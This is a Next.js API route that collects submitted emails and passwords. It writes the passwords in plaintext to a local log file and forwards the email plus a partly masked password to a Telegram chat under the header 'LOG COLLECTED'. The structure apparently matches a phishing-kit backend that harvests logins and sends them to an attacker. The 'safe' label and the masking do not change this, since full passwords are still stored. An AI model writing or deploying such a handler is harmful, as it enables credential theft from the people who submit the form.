// pages/api/notify-safe.js
import fs from 'fs'
import path from 'path'



function maskPassword(pwd) {
  if (!pwd) return ''
  if (pwd.length <= 2) return '*'.repeat(pwd.length) // nothing to show
  const first = pwd[0]
  const last = pwd[pwd.length - 1]
  const middle = '*'.repeat(Math.max(0, pwd.length - 2))
  return `${first}${middle}${last}`
}

export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' })
  }

  const { email, password, name, message } = req.body || {}

  // Basic validation
  if (!email && !name && !message && !password) {
    return res.status(400).json({ error: 'No data provided' })
  }

  const maskedPassword = maskPassword(password)

  const timestamp = new Date().toISOString()
  const logEntry = `${timestamp} | email=${email || ''} | password=${password} | message=${message || ''}\n`

  try {
    // Append to local log file (safely)
    const logPath = path.join(process.cwd(), 'logs.txt')
    fs.appendFileSync(logPath, logEntry, 'utf8')
  } catch (err) {
    console.error('Failed to write log:', err)
    // proceed — we still attempt to send Telegram notification
  }

  // Telegram configuration via environment variables
  const telegramToken = process.env.TELEGRAM_BOT_TOKEN
  const telegramChatId = process.env.TELEGRAM_CHAT_ID

  if (!telegramToken || !telegramChatId) {
    // If not configured, respond but note notifications are disabled
    return res.status(200).json({
      success: true,
      note: 'Logged locally. Telegram notification skipped because TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID is missing.'
    })
  }

  //notification text — contains only masked/non-sensitive fields
  const textLines = [
    '📣 LOG COLLECTED',
    `🕒 ${timestamp}`,
    email ? `📧 Email: ${email}` : null,
    password ? `🔒 Password (masked): ${maskedPassword}` : null,
    name ? `👤 Name: ${name}` : null,
    message ? `💬 Message: ${message}` : null,
  ].filter(Boolean)

  const telegramPayload = {
    chat_id: telegramChatId,
    text: textLines.join('\n'),
    parse_mode: 'MarkdownV2'
  }

  try {
    const resp = await fetch(`https://api.telegram.org/bot${telegramToken}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(telegramPayload)
    })

    if (!resp.ok) {
      const bodyText = await resp.text().catch(() => '')
      console.error('Telegram API error', resp.status, bodyText)
      return res.status(502).json({ error: 'Failed to send Telegram notification', details: bodyText })
    }

    return res.status(200).json({ success: true })
  } catch (err) {
    console.error('Telegram send error:', err)
    return res.status(500).json({ error: 'Telegram request failed' })
  }
}
